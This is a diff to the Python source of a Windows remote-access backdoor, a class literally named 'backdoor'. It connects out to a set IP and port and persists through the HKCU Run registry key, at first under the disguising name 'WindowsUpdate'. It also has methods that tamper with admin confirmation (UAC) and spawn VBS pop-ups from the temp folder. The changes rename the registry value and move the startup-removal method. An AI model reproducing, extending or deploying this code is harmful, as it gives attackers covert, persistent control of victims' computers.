@@ -52,7 +52,7 @@ class backdoor:
             try:
                 self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.connection.connect((ip, port))
-                self.REG_NAME = "WindowsUpdate"
+                self.REG_NAME = "Ninac"
             except socket.error:
                 wait_time = 5
                 print("[-] Error while trying to connect, trying again in {} seconds.".format(wait_time))
@@ -106,7 +106,18 @@ class backdoor:
         else:
             if not on_startup:
                 return "[+] Successfully added to startup."
-
+            
+    def remove_from_startup(self):
+        try:
+            reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
+            DeleteValue(reg_key, self.REG_NAME)
+            CloseKey(reg_key)
+        except FileNotFoundError:
+            return "[-] The program is not registered in startup."
+        except WindowsError as e:
+            return "[-] Error removing value: {}".format(e)
+        else:
+            return "[+] Successfully removed from startup."
 
     def enable_admin_confirm(self):
         try:
@@ -127,20 +138,7 @@ class backdoor:
             return "[+] Ok: {}.".format()
         except Exception as e:
             return "[+] Adm Confirmation Disable. {}".format(e) #temporary fix
-            
-
-    def remove_from_startup(self):
-        try:
-            reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
-            DeleteValue(reg_key, self.REG_NAME)
-            CloseKey(reg_key)
-        except FileNotFoundError:
-            return "[-] The program is not registered in startup."
-        except WindowsError as e:
-            return "[-] Error removing value: {}".format(e)
-        else:
-            return "[+] Successfully removed from startup."
-
+        
     def show_message_box_popup(self, message):
         try:
             str_script = os.path.join(self.TMP, "m.vbs")
